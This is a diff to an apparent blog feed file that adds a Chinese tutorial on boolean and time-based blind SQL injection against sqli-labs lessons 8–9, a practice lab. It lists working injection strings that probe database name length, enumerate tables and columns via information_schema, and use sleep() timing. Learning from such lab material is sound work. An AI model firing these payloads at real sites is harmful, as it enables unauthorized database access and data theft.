@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>布尔盲注与时间盲注</title>
+      <link href="/2023/03/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
+      <url>/2023/03/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sqli-labs-less-8-9"><a href="#sqli-labs-less-8-9" class="headerlink" title="sqli-labs less-8~9"></a>sqli-labs less-8~9</h1><hr><h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h2><hr><p>概念：布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息。<br>布尔盲注我们要用到几个函数：</p><ul><li>substr(str，字符串开始位置，字符串截取个数)</li><li>left(str，从左往右的截取个数)</li><li>right(str，从右往左的截取个数)</li><li>ascii()将str转换为ascll码</li><li>length()返回str长度<br>这里只提到一下这个方法，具体应用等到会写脚本时会具体讲解<br>下面是less-8的一些解题代码：<br>查看库名长度：<br><code>?id=1&#39; and length(database())&gt;0</code><br>爆破库名：<br><code>?id=1&#39; and left(database(),1)&gt;&#39;m&#39; –+</code><br>一个一个尝试得到security<br>爆破表名：<br><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;97 –+</code><br>爆破列名：<br><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1)&gt;&#39;m&#39; –+</code><br>拆解字段：<br><code>?id=1&#39;and ascii((select id from emails limit 0,1))&gt;0 –+</code></li></ul><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>概念：时间盲注：适用于页面不会随着输入语句的不同而发生变化，只会回显一种界面。利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3。<br>函数：</p><ul><li>sleep(int)过int后响应</li><li>if(expr1,expr2,expr3)expr1是true，则返回expr2，或者返回expr3<br>为了更准确的看秒数我们可以开bp也可以如下操作：<br>1、右击黑色处选择检查<br>2、选择网络即可查看秒数<br><img src="/images/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/1.png"><br>要用时间盲注的题目一般关闭了报错和回显，没有任何有用的信息，这时只能通过时间来判断<br>以下给出部分做题代码：<br>判断闭合类型：<br><code>?id=1 and sleep(2)--+</code><br>发现加载时间没有2秒<br><code>?id=1&#39; and sleep(2)--+</code><br>发现有延迟2秒，判断为’闭合<br>接下来爆破库名：<br><code>?id=1 and if(left(database(),1)=&#39;s&#39;,sleep(2),1)--+</code><br>接下来将left(database(),1)&#x3D;’s’给换成其他语句就行了，就不一一例举了</li></ul>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web原理讲解 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sqli-labs-5~7</title>
       <link href="/2023/03/28/sqli-labs-5-7/"/>
       <url>/2023/03/28/sqli-labs-5-7/</url>
